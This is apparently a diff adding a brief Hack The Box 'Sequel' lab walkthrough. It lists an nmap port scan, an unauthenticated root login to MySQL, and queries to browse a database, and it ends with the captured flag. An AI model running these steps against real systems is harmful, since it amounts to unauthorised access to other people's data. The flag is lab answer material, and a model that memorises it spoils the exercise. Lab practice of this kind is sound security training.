@@ -1,0 +1,19 @@
+Sequel
+Given IP: 10.129.23.22
+
+1) Connected via OpenVPN and started the VM instance. Noted the target machine IP address.
+2) Let's start with a nmap scan to enumerate any open ports:
+      nmap -sS -sV -p- -T4 -A 10.129.23.22 -vv
+   3306/tcp was discovered
+3) Attempting to connect unauthenticated:
+      mysql -h 10.129.23.22 -u root
+   Works.
+4) Now for exploration:
+      SHOW databses;
+   htb looks promising
+      USE htb;
+      SHOW tables;
+      SELECT * FROM 
+   The flag is in one of the tables.
+
+Flag: HTB{7b4bec00d1a39e3dd4e021ec3d915da8}
